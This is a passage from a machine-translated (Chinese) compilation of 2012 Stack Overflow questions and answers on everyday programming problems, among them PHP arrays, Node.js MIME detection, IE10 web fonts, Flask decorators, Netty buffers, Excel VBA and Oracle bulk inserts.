它不会回显任何内容（什么都不会显示），是的，每条记录都有一个`total`，它被称为`total`如何修复我的代码，因此它将回显第 17 条记录的总数（这也是最后一条记录），或者我将如何回显出数组的最后一条记录？

谢谢，J

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-25T16:33:48.193

请记住，数组是从零开始的。这意味着您的第一个元素是 0，而在这种情况下，最后一个元素是 16，而不是 17。`$i-1`会这样做，或者更通用的解决方案是使用[`end`](http://php.net/manual/en/function.end.php).

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-25T16:33:58.040

数组从索引 0 开始。

```
echo $previousBalance2[$i - 1]['total']; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-25T16:34:42.913

为了打印数组的最后一个元素，请使用以下代码：

```
$last_element = end($previousBalance2); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-25T16:35:18.720

PHP 数组从 0 开始。所以试试这个：$i-1 而不是 $i 在括号中！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-25T16:34:37.213

回声 $previousBalance2[$i-1]['total']?

# node.js - Nodejs - 检索远程文件并检测 mime 类型

> ID：12587281
> 
> 赞同：1
> 
> 时间：2012-09-25T16:32:37.623
> 
> 标签：node.js, mime-types

所以，这是我的问题。我从一些 API 中读取了一个指向文件的 URL。关于这个文件，我唯一知道的是它是一个文件……但我想检测一下这是什么类型的文件。URL 没有帮助，因为它是用 base64 编码的（我猜），所以我没有可以用于我的范围的文件名或扩展名。

我曾尝试使用 node-mime 模块（[https://github.com/broofa/node-mime](https://github.com/broofa/node-mime)），但我得到的是*application/octet-stream*，它在检测文件的真实类型方面没有多大用处。

目的是“在浏览器中”显示浏览器能够处理的文件，而无需用户下载它们。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-07-29T21:57:10.130

mmmagic 可以工作，但需要外部库 (libmagic) 或 Python 等效库。如果您不想在 Windows 机器上安装 Python，这会出现问题。拥有 libmagic 的纯节点版本会很好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T18:12:17.980

如果您想在浏览器本身中显示文件而无需下载，请使用“Content-Disposition: inline”标头。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-25T17:19:08.043

使用 mmmagic 确定 mime 类型。

[https://npmjs.org/package/mmmagic](https://npmjs.org/package/mmmagic)

# android - 根据状态更改 ImageButton 的背景颜色

> ID：12587282
> 
> 赞同：0
> 
> 时间：2012-09-25T16:32:39.317
> 
> 标签：android, imagebutton

我看到了这个问题（http://stackoverflow.com/questions/1521640/standard-android-button-with-a-different-color），它适用于普通按钮。现在我想在我的 ImageButtons 上应用相同的程序，在其上添加一个带有 android:src="@drawable/icon_name" 的图标

我在styles.xml 中定义了以下样式

```
<style name="ImageButton" parent="android:Widget.ImageButton">
        <item name="android:background">@drawable/custom_image_button</item>
</style> 
```

并设置 custom_image_button.xml 与我引用的 custom_button.xml 类似，但问题是，通过定义我的主题，我可以找到一个`android:buttonStyle`，但没有`android:imageButtonStyle`或类似的东西。还有其他方法可以达到这一点吗？或者是自定义 ImageButtons 时为每个状态创建单个图标的唯一选择？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:38:34.350

我认为您需要仔细检查-`android:imageButtonStyle`主题有一个属性。有关主题的所有可能属性，请参见[theme.xml](https://github.com/android/platform_frameworks_base/blob/master/core/res/res/values/themes.xml)。

# spring - 带有 struts2 控制器的 Spring 3.1.2 中的 @Scope 请求和原型

> ID：12587285
> 
> 赞同：1
> 
> 时间：2012-09-25T16:33:06.633
> 
> 标签：spring, struts2

我正在尝试从 Spring 3.0.3 升级到 3.1.2。

它是一个 struts2 应用程序，控制器/动作标记为 @Scope("request")。

每个请求都会创建一个新的操作对象。动作 bean 有一个`SearchCriteria`注入其中的对象。SearchCriteria 类用@Scope("prototype") 标记。所以我希望在每个请求上都会创建一个新的，这就是它与 spring 3.0.3 的工作方式。

但现在它第一次将其视为原型并创建一个新的，但从那时起它使用缓存版本。我试图调试它，但没有得到快速的地方。

也许有一个我不知道的新配置设置？或任何其他想法将不胜感激。

# html - 为什么 IE10 的“IE8 标准”模式与 IE9 不同？

> ID：12587288
> 
> 赞同：7
> 
> 时间：2012-09-25T16:33:25.740
> 
> 标签：html, internet-explorer-9, font-face, internet-explorer-10

我有以下 HTML：

```
<!DOCTYPE HTML>
<html>
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=8" />
        <link href='https://fonts.googleapis.com/css?family=Bitter:400' rel='stylesheet' type='text/css'/>

        <style type="text/css">

        h1 {
            font-family: Bitter;
            font-weight: normal;            
        }
        </style>
    </head>
    <body>
        <h1>Why is this different?</h1>
    </body>
</html> 
```

在 Windows 7 上的**IE9 中**查看时，`Bitter`字体已正确加载并应用：![IE9 Windows 7 上的 HTML](../Images/ae2fabfdc6eb4113c1c8c804e8247023.png)

但**在 Windows 8 上的 IE10 中**查看时并非如此，而是使用默认字体 ( `Times New Roman`)： ![IE10 Windows 8 上的 HTML](../Images/74f1bd6388808f74f9d301df10579593.png)

由于两个浏览器都使用相同的`Document Mode`（因为`X-UA-Compatible`元标记），我原以为两者都会使用 Bitter 字体或失败并使用 Times New Roman 字体。但是，一个正在运行（Windows 7 上的 IE9），一个失败（Windows 8 上的 IE10）

这是一个已知问题还是记录在案的功能？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-30T20:46:34.260

*更新。*

由于 IE 的性质，这似乎是一个复杂的问题。为了涵盖根据您的具体情况可能会出现的不同问题，这里提供了似乎来自参与者研究的选项。

*注意：请务必清除您可能拥有的页面缓存，以确保它们被正确加载/提供。*

* * *

***选项1：***

将您的兼容性元标记更改为 `<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />`.

通过将 from 更改`IE=8`为`EmulateIE8`您会导致兼容模式尊重 DOCTYPE，这反过来会导致 IE 从 CSS 文件中正确加载字体首选项。

* * *

***选项 2：***

检查您使用的文件格式是否以 IE 可以使用和理解的格式提供。

```
@font-face {
  font-family: 'Bitter';
  font-style: normal;
  font-weight: 400;
  src: url(https://themes.googleusercontent.com/static/fonts/bitter/v4/XexqN1a_o27MhVVdJFKAcA.eot);
  src: local('Bitter-Regular'), url(https://themes.googleusercontent.com/static/fonts/bitter/v4/XexqN1a_o27MhVVdJFKAcA.eot) format('embedded-opentype'), url(https://themes.googleusercontent.com/static/fonts/bitter/v4/SHIcXhdd5RknatSgOzyEkA.woff) format('woff');
} 
```

查看此文件时要注意的重要项目是字体的文件格式。现在就 IE 字体支持而言，它有点像这样：

*   ***IE8仅***支持.eot 格式。
*   IE9/10 支持 .woff 和 .eot 格式。

* * *

***选项 3：***

如果您在此处达到此选项，那么您可能会处理 IE 有时对 Web 标准的采用和实施不佳。可能发生的情况是 IE9 以 IE8 模式显示页面，但也添加了它自己对 .woff 格式的支持。另一方面，IE10 使用它*实际*支持的文件格式以 IE8 模式正确显示页面。因此，我的结论是 IE10 实际上正确地显示了页面，而 IE9 试图掩盖糟糕的标准支持。

由于您在下面的评论中还提到它现在似乎可以工作，因此这里的另一个想法是，谷歌可能错误地提供了错误的格式，因为浏览器是 IE10，但在 IE8 模式下显示内容。如果是这种情况，那么 IE8 的“正确”显示将意味着 IE10 可接受的 .woff 文件不适用于 IE8。

* * *

***边注：***

正是这种事情是所有 Web 开发人员遇到麻烦的最大原因之一。IE 竞争指出了非常差的支持和不正确的实施，但仍然处于劣势，因为 IE 预装在市场上很大比例的 PC 上，因为大多数 PC 都运行特定的操作系统。这是接受、实施和使用标准和最佳实践的一个非常有力的论据。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-27T10:30:24.480

如果字体实际上在 IE8 本身中不起作用，那么听起来 IE10 比 IE9 具有更好的兼容性引擎——因为它实际上正确地描述了 IE8 呈现的内容。

为什么 IE9 Compat 8 实际上会显示字体，为什么字体在 IE8 中不起作用？我会将其归结为字体文件问题。`@font-face`似乎很受问题困扰-字体属性设置有时似乎是其中之一。请参阅：[为什么这些字体之一在 IE8 中呈现，而其他字体却没有？](https://stackoverflow.com/questions/12449512/why-does-one-of-these-font-face-render-in-ie8-but-the-others-dont/12459447#12459447).

下载字体后，通过[Font Squirrels 生成器](http://www.fontsquirrel.com/fontface/generator)，并使用我自己的代码在本地托管字体文件集`@font-face`，您报告该字体适用于 IE10 Compat 8。我可以确认它在所有 Compat 模式下也适用于 IE9，以及 IE7/8。

[Bitter 字体在 IE10 兼容模式下使用 Font Squirrel 生成的字体文件/代码。](http://pulse-dev.com/files/stackoverflow/bitter/bitter-regular-demo.html)

正如你所说的其他谷歌字体在 IE9/10 兼容模式 8 中都可以工作，我认为它确实解决了问题在于字体文件本身的问题 - 以及 IE 似乎在随机情况下与它的属性有关的问题. Font Squirrel 生成器似乎可以解决大多数人遇到的`@font-face`问题 - 但正如您在[为什么这些字体之一在 IE8 中呈现，而其他字体不呈现？](https://stackoverflow.com/questions/12449512/why-does-one-of-these-font-face-render-in-ie8-but-the-others-dont/12459447#12459447)，情况并非总是如此。

由于这不是唯一的兼容性问题——它在 IE8 中根本不起作用——看起来你唯一的选择是在本地托管字体。

如果您想更好地控制字体以及在字体加载或失败时操纵元素 CSS 的能力，请参阅：[如何知道字体 (@font-face) 是否已加载？](https://stackoverflow.com/questions/12312323/how-to-know-if-a-font-font-face-has-already-been-loaded/12316349#12316349)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-28T20:25:45.777

> 我已经验证在 IE8 上（而不是在 IE8 文档模式下运行的另一个 IE 版本），上面的 HTML 不起作用（即显示为在 Windows 8 上的 IE10 示例中），所以看起来 IE10 有一个更改的版本更准确的IE8文档模式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-05T18:54:37.960

如果您的服务器是 apache，您可以在网站根目录下的 .htaccess 文件的 by 2 行中替换此指令：

```
BrowserMatch MSIE best-standards-support
Header set X-UA-Compatible IE=8 env=best-standards-support 
```

有了这个，我在 IE10 或 IE11 甚至模拟 IE8 下的谷歌字体都没有问题了。

# python - 在 Flask 中使用 GAE 查看 JSON 渲染装饰器

> ID：12587290
> 
> 赞同：1
> 
> 时间：2012-09-25T16:33:34.793
> 
> 标签：python, json, google-app-engine, flask

我正在尝试按照以下片段在 Flask 中为 JSON 编写视图渲染装饰器：http: [//flask.pocoo.org/snippets/18/](http://flask.pocoo.org/snippets/18/)

问题是我需要序列化为 JSON、GAE 模型，而*jsonify*函数对此不起作用。为此，我使用以下代码：[http ://blog.worldmaker.net/2009/dec/08/simple-app-engine-json-serialization-snippet/](http://blog.worldmaker.net/2009/dec/08/simple-app-engine-json-serialization-snippet/)

与上面代码片段中的 render_html 示例类似，我编写了以下代码：

```
def render_json(result):
  def wrapped(*args, **kwargs):
    json_string = json.dumps(result, cls=GaeEncoder)
    return app.response_class(response=json_string, mimetype='application/json')
  return wrapped 
```

问题是我调用了一个用我的新装饰器装饰的函数，我收到以下错误：

```
AttributeError: 'Response' object has no attribute 'next' 
```

谁能指出这里发生了什么？谢谢！

马科斯

编辑：这是回溯

```
Traceback (most recent call last):
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/runtime/wsgi.py", line 208, in Handle
for chunk in result:
File "/Users/mchicote/Documents/projects/schoolnetwork/code/SchoolNetwork/sn/../lib/flaskext/gae_mini_profiler/profiler.py", line 286, in __call__
yield self.prof.runcall(result.next)
File "/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/cProfile.py", line 149, in runcall
return func(*args, **kw)
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/appstats/recording.py", line 1284, in appstats_wsgi_wrapper
result = app(environ, appstats_start_response)
File "/Users/mchicote/Documents/projects/schoolnetwork/code/SchoolNetwork/sn/../lib/flaskext/gae_mini_profiler/profiler.py", line 269, in wrapped_appstats_app
return old_app(environ, start_response)
File "/Users/mchicote/Documents/projects/schoolnetwork/code/SchoolNetwork/sn/../lib/flask/app.py", line 1689, in wsgi_app
response = self.make_response(self.handle_exception(e))
File "/Users/mchicote/Documents/projects/schoolnetwork/code/SchoolNetwork/sn/../lib/flask/app.py", line 1687, in wsgi_app
response = self.full_dispatch_request()
File "/Users/mchicote/Documents/projects/schoolnetwork/code/SchoolNetwork/sn/../lib/flask/app.py", line 1361, in full_dispatch_request
response = self.make_response(rv)
File "/Users/mchicote/Documents/projects/schoolnetwork/code/SchoolNetwork/sn/../lib/flask/app.py", line 1450, in make_response
rv = self.response_class.force_type(rv, request.environ)
File "/Users/mchicote/Documents/projects/schoolnetwork/code/SchoolNetwork/sn/../lib/werkzeug/wrappers.py", line 711, in force_type
response = BaseResponse(*_run_wsgi_app(response, environ))
File "/Users/mchicote/Documents/projects/schoolnetwork/code/SchoolNetwork/sn/../lib/werkzeug/wrappers.py", line 55, in _run_wsgi_app
return _run_wsgi_app(*args)
File "/Users/mchicote/Documents/projects/schoolnetwork/code/SchoolNetwork/sn/../lib/werkzeug/test.py", line 836, in run_wsgi_app
buffer.append(app_iter.next()) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T08:06:08.670

知道了！以防万一有人觉得它有帮助......

第一个问题是我没有遵循上面片段中描述的完全相同的模式。当我尝试遵循该模式时，我收到以下错误：

```
TypeError: wrapped() takes exactly 1 argument (2 given) 
```

我尝试改变模式，因为 render_json 不接受任何参数（与采用模板的 render_html 相比），并编写了上面描述的 render_json 函数（以及原始帖子中描述的问题）。在尝试了一些事情之后，我突然想到我可能没有正确处理参数数量错误，所以我回到使用原始模式编写render_json。我得到了以下功能：

```
def render_json(**defaults):
    def wrapped(result):
        variables = defaults.copy()
        variables.update(result)
        json_string = json.dumps(result, cls=GaeEncoder)
        return app.response_class(response=json_string, mimetype='application/json')                       
    return wrapped 
```

回到参数数量错误，我尝试以不同的方式解决它。不知何故，我突然想到问题可能出在 render_json 函数的使用上。render_html 的装饰器用法如下所示：

```
@view(school_blueprint, '/', render_html('school/index.html')) 
```

render_json 的用法如下所示：

```
@view(school_blueprint, '/api/list', render_json) 
```

作为 Python 新手，我突然想到我实际上并没有调用 render_json 函数，而只是命名它。添加（）解决了这个问题。新用法如下所示：

```
@view(school_blueprint, '/api/list', render_json()) 
```

无论如何，由于我是 Python 新手，我不知道技术解释，但在我看来，这是名称与调用问题。

谢谢你的帮助。

马科斯

# css - Safari 5.1 正在推动边距/填充超过 50+ 像素

> ID：12587292
> 
> 赞同：0
> 
> 时间：2012-09-25T16:33:41.577
> 
> 标签：css, wordpress, safari

我无法弄清楚（经过多次尝试）并且似乎无法在网上找到任何答案。我已经调整了边距、填充和边框。没有人会让 Safari 5.1 让步。我在主页上插入了一个 35 px 的右填充（见附件）。在其他浏览器上看起来还不错，但 Safari 将内边距推出了 50 多像素。任何想法如何修复，破解或重新工作？URL 是 hazelhomemaker.com 我正在使用带有子主题的 WordPress。

![在此处输入图像描述](../Images/2837995fa983068110b6b0c477bd44a9.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T04:13:04.077

当我分析您的代码时，我了解到它不是内容（文本），而是**透明图像**。所以显然`word-wrap`在这里会失败。

问题是您没有为此`img`标签使用单独的类（您正在为页面中的一组标签提供相同的属性）。因此，为标记分配一个单独的类`img`并提供以下属性。你的问题将得到解决。

```
width:90%; /* Give width only in percentages */
margin:0 auto; 
```

如果`margin:0 auto`不起作用，请给`text-align:center`您的`div.block-content`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T19:47:03.097

您提到了指定边距/填充/边框，但是您`max-width`是否为该 div 设置了一个？这应该可以防止文本超出您希望它在任何/大多数浏览器中停止的位置。

# javascript - 从循环创建多级 json

> ID：12587293
> 
> 赞同：0
> 
> 时间：2012-09-25T16:33:41.660
> 
> 标签：javascript, json, angularjs

我正在用角度编写指令来帮助验证字段。它正在工作到存储验证结果的地步。

我想将它存储在一个对象中`error.password.old`

执行此操作的代码如下所示：

```
if(!(typeof iAttrs.ngModel == "undefined"))
{
    var model = iAttrs.ngModel.split('.');
    var length = model.length;
    var target = scope.error;

    if(typeof validation[iAttrs.validate] == "function")
    {
       for(var index = 0; index < length; index++)
       {
           target = target[model[index]];
       }
       target = validation[iAttrs.validate]();
       scope.$apply();
    }
    else throw("function " + iAttrs.validate + " does not exist.");
 } 
```

iAttrs.ngModel 持有“password.old”。

谷歌目前正在抛出：

> 未捕获的类型错误：无法读取未定义的属性“旧”

这是在 for 循环的第二次迭代中抛出的。

我知道它是未定义的，但我需要找到一种方法在没有正常 {} 表示法的情况下动态定义它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:42:53.740

我正在使用以下代码来做到这一点。

```
 function createObj( str ) {

            var d = str.split("."), j, o = scope.error;
            for (j = 0; j < d.length; j = j + 1) {
                o[d[j]] = o[d[j]] || {};
                o = o[d[j]];
            }
            return o;
        }

    createObj(iAttrs.ngModel); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:50:18.987

您可以使用该`$parse`服务：[http ://docs.angularjs.org/api/ng.$parse](http://docs.angularjs.org/api/ng.%24parse)

[http://jsfiddle.net/4LhN9/27/](http://jsfiddle.net/4LhN9/27/)

# tabs - 如何自动确定vim中的选项卡类型并相应地设置expandtab？

> ID：12587294
> 
> 赞同：2
> 
> 时间：2012-09-25T16:33:41.247
> 
> 标签：tabs, vim, vi

vim 是否可以尝试自动确定文件的制表符类型（制表符或空格）并将制表符属性设置为自动匹配？如果没有，是否有插件可以做到这一点？

我正在处理一个庞大的、杂乱无章的代码库，让 vim 尝试对每个文件执行此操作会很好。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T16:39:34.630

我认为这个插件[http://www.vim.org/scripts/script.php?script_id=1171](http://www.vim.org/scripts/script.php?script_id=1171)正是你想要的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T16:51:59.780

I have written the [IndentConsistencyCop plugin](http://www.vim.org/scripts/script.php?script_id=1690) for this detection (and to alert me to files with a mix of styles). It provides an `:IndentConsistencyCop` command; the check can be done automatically when a buffer is opened via the [IndentConsistencyCopAutoCmds extension](http://www.vim.org/scripts/script.php?script_id=1691).

The plugin page also has links to alternatives.

# sockets - 如何使用netty在套接字服务中传输大字节流（如图像）

> ID：12587295
> 
> 赞同：0
> 
> 时间：2012-09-25T16:33:44.370
> 
> 标签：sockets, netty, indexoutofboundsexception, decoder, socketchannel

我的服务器为客户端提供套接字服务。我的服务器`DecoderHandler`从`FrameDecoder`. 当我的客户端向服务器发送小数据（小于约 1024 字节）时，服务器成功解码，但是当我的客户端尝试将图像的内容写入服务器时，出现 index-out-bound-exception .

我猜解码器选择的缓冲区必须有大小限制。于是我打印出了参数——buffer的类。

```
@Override
protected Object decode(ChannelHandlerContext ctx, Channel channel,
        ChannelBuffer buffer) throws Exception {
    System.out.println(buffer.getClass());
    return null;
} 
```

结果是：

`class org.jboss.netty.buffer.BigEndianHeapChannelBuffer`

我想问一下：我可以将缓冲区的类型从更改`BigEndianHeapChannelBuffer`为`DynamicChannelBuffer`，以便我可以通过套接字传输图像。或者有没有人可以提供其他有效的方法来帮助解决我的“通过netty通过套接字传输大数据”的问题。

我真的需要你的意见。再次感谢！

* * *

来自服务器的堆栈跟踪：

```
java.lang.IndexOutOfBoundsException
at org.jboss.netty.buffer.AbstractChannelBuffer.checkReadableBytes(AbstractChannelBuffer.java:657)
at org.jboss.netty.buffer.AbstractChannelBuffer.readBytes(AbstractChannelBuffer.java:337)
at org.jboss.netty.buffer.AbstractChannelBuffer.readBytes(AbstractChannelBuffer.java:343)
at com.netty.www.codec.MessageDecoder.receiveChatInfoBeanFromClient(MessageDecoder.java:422)
at com.netty.www.codec.MessageDecoder.decode(MessageDecoder.java:70)
at org.jboss.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:282)
at org.jboss.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:216)
at org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:274)
at org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:261)
at org.jboss.netty.channel.socket.nio.NioWorker.read(NioWorker.java:349)
at org.jboss.netty.channel.socket.nio.NioWorker.processSelectedKeys(NioWorker.java:280)
at org.jboss.netty.channel.socket.nio.NioWorker.run(NioWorker.java:200)
at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
at java.lang.Thread.run(Thread.java:619)
12/09/26 09:12:09 INFO server.MessageServerHandler: The user's channel is closed: 
```

来自客户端的堆栈跟踪：

```
java.net.SocketException: Software caused connection abort: socket write error
at java.net.SocketOutputStream.socketWrite0(Native Method)
at java.net.SocketOutputStream.socketWrite(Unknown Source)
at java.net.SocketOutputStream.write(Unknown Source)
at java.io.BufferedOutputStream.flushBuffer(Unknown Source)
at java.io.BufferedOutputStream.write(Unknown Source)
at neusoft.socket.TCPClient.writeBytes(TCPClient.java:217)
at neusoft.socket.TestChatNew.sendChartMedia(TestChatNew.java:185)
at neusoft.socket.TestChatNew.main(TestChatNew.java:36) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T13:12:09.880

从堆栈跟踪中可以清楚地看出这是您的处理程序中的一个错误。您尝试访问更多字节，然后在 com.netty.www.codec.MessageDecoder.receiveChatInfoBeanFromClient 中出现

您需要通过“ChannelBuffer.readableBytes()”检查是否有足够的字节可读，如果没有返回 null，以便在收到更多字节时再次尝试调用您的方法。查看 FrameDecoder 的 apidocs 以获取更多详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T18:09:50.610

请包括堆栈跟踪，因为 IndexOutOfBoundsException 对我来说听起来像是一个错误。还包括 netty 版本等。

# excel - Excel宏如果为空则删除第一行

> ID：12587311
> 
> 赞同：0
> 
> 时间：2012-09-25T16:34:37.037
> 
> 标签：excel, vba

我遇到了一个问题，如果第一行为空，宏将删除整个列。有没有办法找到第一个可用的数据行？我假设问题在于将“A2”命名为范围？

```
Sub PrepForUpload()

Dim rowNumber As Integer

Sheets("Initiatives").Select

ActiveSheet.Range("a2").Select
    While (Range(ActiveCell, ActiveCell.Offset(0, 0)) <> "")
        ActiveCell.Offset(1, 0).Select
    Wend
rowNumber = ActiveCell.Row

ActiveSheet.Range(rowNumber & ":65536").Select
Selection.Clear

Range("A2").Select
ActiveWorkbook.Save

End Sub 
```

任何帮助都会很棒

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:53:13.687

选择会使您的宏变慢。如果您想在最后一个填充的 A 单元格之后清除所有内容，请尝试此操作

```
Sub PrepForUpload()

Dim rowNumber As Integer

with Sheets("Initiatives")

    if len(.cells(2,1))=0 then 
        rowNumber=.cells(2,1).end(xldown).end(xldown).row + 1
    else
        rowNumber=.cells(2,1).end(xldown).row + 1
    end if

    .rows(rowNumber & ":" & .rows.count).Clear

end with

ActiveWorkbook.Save

End Sub 
```

# sql - 验证 Oracle 过程中 BULK INSERT 逻辑中的 PL/SQL 数据类型定义

> ID：12587315
> 
> 赞同：1
> 
> 时间：2012-09-25T16:34:56.183
> 
> 标签：sql, oracle, stored-procedures, bulkinsert

我有两个表，DUMMY_REK 和 DUMMY_REK_LOG。我已经编写了一个存储过程来执行从 DUMMY_REK 到 DUMMY_REK_LOG 的 BULK 插入。该过程运行良好，但我需要添加具有正确数据类型的 INDEX BY 子句。我在当前数据类型定义中遇到错误，因此在下面的代码中注释掉了相同的内容。有人可以建议我正确使用数据类型吗？

```
 CREATE OR REPLACE PROCEDURE BULK_INSERT_REK_LOG 

 as 

   TYPE tA IS TABLE OF DUMMY_REK.ID%TYPE;-- INDEX BY NUMBER;
   TYPE tB IS TABLE OF DUMMY_REK.KEYWORD%TYPE;-- INDEX BY VARCHAR2(256);
   TYPE tC IS TABLE OF DUMMY_REK.CATEGORY%TYPE;-- INDEX BY VARCHAR2(30);
   TYPE tD IS TABLE OF DUMMY_REK.LIST_NAME%TYPE;-- INDEX BY VARCHAR2(30);
   TYPE tE IS TABLE OF DUMMY_REK.EXPIRY_DATE%TYPE;-- INDEX BY DATE;
   TYPE tF IS TABLE OF DUMMY_REK.SUBMITTED_BY%TYPE;-- INDEX BY NUMBER;
   TYPE tG IS TABLE OF DUMMY_REK.SUBMITTER_COMMENTS%TYPE;-- INDEX BY VARCHAR2(4000);
   TYPE tH IS TABLE OF DUMMY_REK.SUBMITTED_TIMESTAMP%TYPE;-- INDEX BY TIMESTAMP(6);   
   TYPE tI IS TABLE OF DUMMY_REK.DECISIONED_BY%TYPE;-- INDEX BY NUMBER;
   TYPE tJ IS TABLE OF DUMMY_REK.DECISIONED_COMMENT%TYPE;-- INDEX BY VARCHAR2(4000);
   TYPE tK IS TABLE OF DUMMY_REK.DECISIONED_TIMESTAMP%TYPE;-- INDEX BY TIMESTAMP(6);
   TYPE tL IS TABLE OF DUMMY_REK.STATUS_ID%TYPE;-- INDEX BY NUMBER;   
   TYPE tM IS TABLE OF DUMMY_REK.LAST_UPDATED_TIMESTAMP%TYPE;-- INDEX BY TIMESTAMP(6);   
   TYPE tN IS TABLE OF DUMMY_REK.IS_DISABLED%TYPE;-- INDEX BY NUMBER;
   TYPE tP IS TABLE OF DUMMY_REK.KEYWORD2%TYPE;-- INDEX BY VARCHAR2(256);   
   TYPE tQ IS TABLE OF DUMMY_REK.ACCOUNT_NUMBER%TYPE;-- INDEX BY NUMBER;  
   TYPE tR IS TABLE OF DUMMY_REK.CUSTOMER_NAME%TYPE;-- INDEX BY VARCHAR2(256);   
   TYPE tS IS TABLE OF DUMMY_REK.TYPE%TYPE;-- INDEX BY NUMBER;  

    i_keyword_id tA;
    i_keyword  tB;
    i_category  tC;
    i_list_name  tD;
    i_expiry_date tE;
    i_submitted_by  tF;
    i_submitter_comments tG;
    i_submittedtimestamp tH;
    i_decisioned_by  tI;
    i_decisioned_comment  tJ;
    i_decisioned_timestamp  tK;
    i_status_id  tL;
    i_last_updated_timestamp  tM;
    i_is_disabled  tN;
    i_keyword2   tP;
    i_account_number  tQ;
    i_customer_name   tR;
    i_type  tS;

BEGIN

  SELECT * BULK COLLECT INTO i_keyword_id,i_keyword,i_category,i_list_name,i_expiry_date,i_submitted_by,i_submitter_comments,i_submittedtimestamp,i_decisioned_by,i_decisioned_comment,i_decisioned_timestamp,i_status_id,i_last_updated_timestamp,i_is_disabled,i_keyword2,i_account_number,i_customer_name,i_type FROM DUMMY_REK;
   FORALL i IN 1 .. 10 
    INSERT INTO DUMMY_REK_LOG(ID,KEYWORD_ID,KEYWORD,CATEGORY,LIST_NAME,EXPIRY_DATE,USERID,COMMENTS,LOGTIMESTAMP,WORKFLOW_ACTION_ID,WORKFLOW_REASON_ID,FROMSTATUS_ID,TOSTATUS_ID,IS_DISABLED,KEYWORD2,ACCOUNT_NUMBER,CUSTOMER_NAME,TYPE)
      VALUES(GET_NEXT_ID('DUMMY_REK_LOG'),i_keyword_id(i),i_keyword(i),i_category(i),i_list_name(i),i_expiry_date(i),i_decisioned_by(i),i_decisioned_comment(i),i_decisioned_timestamp(i),null,null,null,null,0,i_keyword2(i),i_account_number(i),i_customer_name(i),i_type(i));
commit;     

-- Exception Handling
            EXCEPTION
               WHEN OTHERS THEN
                  -- Rollback
           ROLLBACK;
     RAISE;

END BULK_INSERT_REK_LOG; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:47:44.260

正如错误所暗示的：

```
 CREATE OR REPLACE PROCEDURE BULK_INSERT_REK_LOG 

    DECLARE 
```

应该

```
CREATE OR REPLACE PROCEDURE BULK_INSERT_REK_LOG 
AS 
```

# php - 语法荧光笔 - 自动换行问题

> ID：12587327
> 
> 赞同：1
> 
> 时间：2012-09-25T16:36:05.087
> 
> 标签：php, javascript, jquery, syntax-highlighting, word-wrap

**好的，这是问题：**

*   我一直在[Snippet.MX](http://www.snippet.mx)`SyntaxHighlighter.js`上使用一些代码着色

正如您所看到的，除了一点点细节之外，这个东西是有效的：**不**`Word wrapping`支持。

 ****我试过了 ：**

*   添加`white-space: pre-wrap;`到`pre`元素
*   添加适当的 CSS3 属性
*   按照其他人的建议使用 jquery hack（您会在页面的最底部注意到它）

有任何想法吗？**

# c - 目标c中的数学

> ID：12587331
> 
> 赞同：-2
> 
> 时间：2012-09-25T16:36:17.660
> 
> 标签：c, math, long-integer

我遇到了一个我认为很容易解决的问题，但我找不到答案：

```
long test = 8064269 / 8300000;
NSLog(@"%lu",test); 
```

日志给了我：

```
0 (should be something near to 1) 
```

稍后我需要对此做更多的数学运算，然后是：

```
long test = 8064269 / 8300000 * 277;
NSLog(@"%lu",test); 
```

日志给了我：

```
4294967048 (should be something near to 277) 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:38:06.300

```
8064269 / 8300000 
```

是整数除法，因为所有操作数都是整数类型。也就是说，它会截断小数部分，只留下整数部分，即 0。

但即使不是这种情况，您如何期望将小数存储在整数中（在 a 中`long`）？同样，分配给整数也会截断结果。首先，你需要

```
float test = 8064269.0 / 8300000.0;
NSLog(@"%f", test); 
```

# php - 有什么方法可以遍历一组已发布的变量，检查它们是否已设置？

> ID：12587332
> 
> 赞同：-1
> 
> 时间：2012-09-25T16:36:24.613
> 
> 标签：php, html, post, error-handling, submit

我当前的代码会冗长且重复，有什么方法可以让我遍历发布的变量并检查它们是否是使用 isset() 函数设置的。

这是我的代码：

```
$item_name = $_POST['item_name'];
